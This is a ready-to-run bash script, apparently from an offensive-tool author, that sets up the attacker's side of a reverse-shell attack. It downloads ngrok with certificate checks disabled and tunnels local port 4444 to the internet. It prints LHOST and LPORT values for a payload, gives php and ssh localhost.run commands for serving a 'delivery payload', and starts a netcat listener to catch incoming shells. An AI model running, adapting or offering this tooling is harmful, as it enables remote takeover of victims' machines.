#!/bin/bash
# coded by: @linux_choice (twitter)
# github.com/thelinuxchoice/

trap 'printf "\n";stop' 2
ngrok_tcp="3.17.202.129"


stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)

if [[ $checkngrok == *'ngrok'* ]]; then
killall -2 ngrok > /dev/null 2>&1
fi
exit 1

}

ngrok_server() {

if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
arch3=$(uname -a | grep -o '64bit' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

elif [[ $arch3 == *'64bit'* ]] ; then

wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-amd64.zip ]]; then
unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-amd64.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

if [[ -e check_ngrok ]]; then
rm -rf ngrok_check
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok TCP server on\e[0m\e[1;77m port 4444...\e[0m\n"
./ngrok tcp 4444 > /dev/null 2>&1 > check_ngrok &
sleep 10

check_ngrok=$(grep -o 'ERR_NGROK_302' check_ngrok)

if [[ ! -z $check_ngrok ]];then
printf "\n\e[91mAuthtoken missing!\e[0m\n"
printf "\e[77mSign up at: https://ngrok.com/signup\e[0m\n"
printf "\e[77mYour authtoken is available on your dashboard: https://dashboard.ngrok.com\n\e[0m"
printf "\e[77mInstall your auhtoken:\e[0m\e[93m ./ngrok authtoken <YOUR_AUTHTOKEN>\e[0m\n\n"
rm -rf check_ngrok
exit 1
fi

if [[ -e check_ngrok ]]; then
rm -rf check_ngrok
fi

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://0.tcp.ngrok.io:[0-9]*")
ngrok_port=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://0.tcp.ngrok.io:[0-9]*" | cut -d ':' -f3)
if [[ ! -z $link ]]; then
printf "\n\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[1;91m Delivery payload exposing the server: \e[0m\n"
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[93m php -S 127.0.0.1:3333 \e[0m\n"
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[93m ssh -R 80:localhost:3333 custom-subdomain@ssh.localhost.run \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] Forwarding from:\e[0m\e[1;77m %s\e[0m\n" $link

printf "\e[1;92m[\e[0m+\e[1;93m] LHOST:\e[0m\e[1;77m %s\e[0m\n" $ngrok_tcp
printf "\e[1;92m[\e[0m+\e[1;93m] LPORT:\e[0m\e[1;77m %s\e[0m\n" $ngrok_port
default_start_listener="Y"
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Start Listener? (port 4444) \e[0m\e[1;77m[Y/n]\e[0m\e[1;33m: \e[0m'
read start_listener
start_listener="${start_listener:-${default_start_listener}}"
if [[ $start_listener == "Y" || $start_listener == "y" || $start_listener == "Yes" || $start_listener == "yes" ]]; then
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Listening connection, port 4444 (press ctrl +c to exit):\e[0m\n"
nc -lvp 4444
else
exit 1
fi

else
printf "\n\e[91mNgrok Error!\e[0m\n"
exit 1
fi

}
printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok.io TCP server\e[0m\n"
ngrok_server
